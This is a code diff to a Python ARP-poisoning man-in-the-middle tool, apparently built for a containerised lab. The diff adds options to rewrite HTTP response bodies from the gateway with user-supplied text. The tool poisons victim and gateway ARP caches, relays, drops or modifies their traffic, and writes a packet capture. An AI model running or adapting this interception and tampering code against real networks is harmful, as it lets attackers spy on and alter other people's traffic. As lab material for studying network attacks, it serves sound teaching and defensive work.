@@ -1,4 +1,3 @@
-"""Bidirectional ARP poisoning and an explicit user-space Ethernet relay."""
 import argparse
 import fcntl
 import heapq
@@ -8,7 +7,8 @@ import socket
 import sys
 import time
 
-from .config import ARTIFACTS_DIR, ATTACKER, GATEWAY, IFACE, TRUSTED, VICTIM
+from .config import (ARTIFACTS_DIR, ATTACKER, GATEWAY, HTTP_ORIGINAL_BODY, IFACE, TRUSTED,
+                     VICTIM, replacement_body)
 from .io import (EventLog, OUTGOING, PcapWriter, atomic_json, interface_info, ip_forwarding_enabled,
                  raw_socket, resolve)
 from .packets import (build_arp_reply, complete_transport_checksum, dns_name, mac_bytes, parse_ipv4,
@@ -16,7 +16,7 @@ from .packets import (build_arp_reply, complete_transport_checksum, dns_name, ma
 
 
 def run(args):
-    # A single poisoner per container prevents racing discovery/restoration.
+    replacement = replacement_body(args.text) if args.text is not None else None
     lock = open("/tmp/arplab-attack.lock", "w")
     try:
         fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
@@ -32,7 +32,9 @@ def run(args):
     output = Path(args.output)
     output.mkdir(parents=True, exist_ok=True)
     log = EventLog(output / "events.jsonl")
-    capture = PcapWriter(output / "capture.pcap")
+    capture_path = Path(ARTIFACTS_DIR) / "capture.pcap"
+    capture_path.parent.mkdir(parents=True, exist_ok=True)
+    capture = PcapWriter(capture_path)
     stats = dict(received=0, forwarded=0, dropped=0, modified=0, poison_rounds=0,
                  victim_to_gateway=0, gateway_to_victim=0)
     stop = False
@@ -74,7 +76,6 @@ def run(args):
                 frame, addr = sock.recvfrom(65535)
             except socket.timeout:
                 continue
-            # Ignore locally transmitted frames and traffic unrelated to the two victims.
             if addr[2] == OUTGOING or frame[:6] != mac_bytes(own_mac):
                 continue
             info = parse_ipv4(frame)
@@ -101,10 +102,12 @@ def run(args):
                 stats["dropped"] += 1
                 continue
             if args.mode == "modify" and http and source == args.gateway:
-                frame, changed = replace_tcp_payload(frame)
+                frame, changed = (replace_tcp_payload(frame, HTTP_ORIGINAL_BODY, replacement)
+                                  if replacement is not None else replace_tcp_payload(frame))
                 if changed:
                     stats["modified"] += 1
-                    log.emit("modified", original="ORIGINAL", replacement="MODIFIED")
+                    log.emit("modified", original="ORIGINAL",
+                             replacement=args.text if replacement is not None else "MODIFIED")
             frame = complete_transport_checksum(frame)
             frame = rewrite_ethernet(frame, peers[dest], own_mac)
             if args.delay_ms:
@@ -120,8 +123,6 @@ def run(args):
     finally:
         stats["dropped"] += len(pending)
         if started:
-            # Keep Ethernet source ours to avoid moving peers' bridge FDB entries.
-            # ARP sender hardware addresses carry the genuine mappings being restored.
             try:
                 for _ in range(5):
                     for target, claimed in ((args.victim, args.gateway), (args.gateway, args.victim)):
@@ -152,11 +153,27 @@ def main():
     parser.add_argument("--gateway", default=GATEWAY)
     parser.add_argument("--interface", default=IFACE)
     parser.add_argument("--mode", choices=("relay", "modify", "drop"), default="relay")
+    parser.add_argument("--text", help="Replacement HTTP body text (up to 1023 UTF-8 bytes)")
+    parser.add_argument("--prompt", action="store_true", help="Read replacement text from the terminal")
     parser.add_argument("--duration", type=float, default=60, help="Seconds; SIGINT/SIGTERM also restore caches")
     parser.add_argument("--interval", type=float, default=1)
     parser.add_argument("--delay-ms", type=float, default=0)
     parser.add_argument("--output", default=f"{ARTIFACTS_DIR}/manual")
     args = parser.parse_args()
+    if args.prompt:
+        if args.mode != "modify" or args.text is not None:
+            parser.error("--prompt requires --mode modify and cannot be combined with --text")
+        try:
+            args.text = input("Replacement text (up to 1023 UTF-8 bytes): ")
+        except (EOFError, KeyboardInterrupt):
+            return 1
+    if args.text is not None:
+        if args.mode != "modify":
+            parser.error("--text requires --mode modify")
+        try:
+            replacement_body(args.text)
+        except ValueError as exc:
+            parser.error(str(exc))
     import math
     if not all(math.isfinite(v) for v in (args.duration, args.interval, args.delay_ms)) or \
             not 0 < args.duration <= 3600 or not 0.1 <= args.interval <= 10 or not 0 <= args.delay_ms <= 500:
